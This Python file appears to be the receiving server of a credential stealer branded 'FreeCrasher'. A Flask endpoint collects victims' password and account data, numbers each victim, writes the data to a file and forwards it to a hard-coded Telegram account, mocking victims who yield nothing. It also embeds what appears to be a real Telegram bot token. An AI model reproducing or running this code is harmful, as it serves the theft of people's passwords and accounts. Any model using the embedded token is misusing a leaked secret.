import telebot
from flask import Flask, request
import os
import threading

API_TOKEN = '8534815900:AAHxGeuG6_SnOzIXwFTmaKoaMFiHsDX4b7E'
MY_ID = 5279200582
app = Flask(__name__)
bot = telebot.TeleBot(API_TOKEN)

def get_uid():
    path = "uid.txt"
    if not os.path.exists(path): open(path, "w").write("0")
    with open(path, "r+") as f:
        n = int(f.read()) + 1
        f.seek(0); f.write(str(n)); f.truncate()
        return n

@app.route('/sync', methods=['POST'])
def handle():
    payload = request.json
    uid = get_uid()
    out = f"user_{uid}_password_and_accs.txt"
    is_poor = all(v == "NONE" or v == "NOT_FOUND" for v in payload.values())
    
    with open(out, "w", encoding='utf-8') as f:
        if is_poor:
            f.write(f"User_{uid} нищита")
            cap = f"**FreeCrasher Alert**\nID: {uid}\nСтатус: **НИЩИТА**"
        else:
            f.write(f"=== FREE CRASHER DATA USER {uid} ===\n\n")
            for k, v in payload.items(): f.write(f"[{k}]:\n{v}\n\n")
            cap = f" **FreeCrasher Alert**\nID: {uid}\nСтатус: **ЛОГ ПОЛУЧЕН**"

    with open(out, 'rb') as doc:
        bot.send_document(MY_ID, doc, caption=cap, parse_mode='Markdown')
    
    os.remove(out)
    return "OK"

threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000)).start()
bot.polling()